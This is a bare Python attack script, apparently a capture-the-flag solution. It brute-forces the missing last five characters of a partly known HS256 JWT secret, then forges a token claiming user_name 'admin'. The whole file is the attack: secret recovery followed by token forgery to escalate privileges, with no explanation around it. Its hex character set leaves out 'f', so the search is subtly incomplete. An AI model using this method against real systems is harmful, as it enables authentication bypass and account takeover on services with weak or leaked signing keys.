import jwt
import datetime
import itertools

s = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiIxMjMiLCJleHAiOjE3NTA4NzA5NjV9.WEthUMcQERT8Kh22basn5mDdYLCdgc3raKq33avvijI'
hexs = '0123456789abcde'

key='cb89417f-4e45-4600-9b42-70941c488ade'
key='cb89417f-4e45-4600-9b42-70941c4'

for i in itertools.product(hexs, repeat=5):
    t = key + ''.join(i)
    try:
        print(jwt.decode(s, t, algorithms='HS256'))
        print(t)
        print(jwt.encode({'user_name': 'admin', 'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)}, t, algorithm='HS256'))
        break
    except:
        pass